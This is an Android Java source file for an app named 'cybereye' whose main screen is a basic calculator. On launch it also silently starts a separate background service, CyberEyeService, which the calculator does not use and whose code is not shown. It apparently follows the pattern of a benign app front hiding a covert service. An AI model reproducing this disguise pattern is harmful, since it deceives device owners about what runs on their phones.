package com.cybereye.app;

import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private TextView display;
    private String currentInput = "";
    private String operator = "";
    private double firstNum = 0;
    private boolean newNumber = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new android.content.Intent(this, CyberEyeService.class));
        display = findViewById(R.id.display);
        setupButtons();
    }

    private void setupButtons() {
        int[] ids = {R.id.btn_0, R.id.btn_1, R.id.btn_2, R.id.btn_3, R.id.btn_4,
                      R.id.btn_5, R.id.btn_6, R.id.btn_7, R.id.btn_8, R.id.btn_9,
                      R.id.btn_add, R.id.btn_sub, R.id.btn_mul, R.id.btn_div,
                      R.id.btn_equals, R.id.btn_clear};
        for (int id : ids) findViewById(id).setOnClickListener(this::onClick);
    }

    public void onClick(View v) {
        Button b = (Button) v;
        String text = b.getText().toString();
        switch (text) {
            case "C": clear(); break;
            case "=": calculate(); break;
            case "+": case "-": case "×": case "÷": setOp(text); break;
            default: append(text); break;
        }
    }

    private void append(String num) {
        if (newNumber) { currentInput = num; newNumber = false; } 
        else { currentInput += num; }
        display.setText(currentInput);
    }

    private void setOp(String op) {
        if (!currentInput.isEmpty()) firstNum = Double.parseDouble(currentInput);
        operator = op;
        newNumber = true;
    }

    private void calculate() {
        if (operator.isEmpty() || currentInput.isEmpty()) return;
        double second = Double.parseDouble(currentInput);
        double result = 0;
        switch (operator) {
            case "+": result = firstNum + second; break;
            case "-": result = firstNum - second; break;
            case "×": result = firstNum * second; break;
            case "÷": result = firstNum / second; break;
        }
        display.setText(String.valueOf(result));
        currentInput = String.valueOf(result);
        operator = "";
        newNumber = true;
    }

    private void clear() {
        currentInput = "";
        operator = "";
        firstNum = 0;
        newNumber = true;
        display.setText("0");
    }
}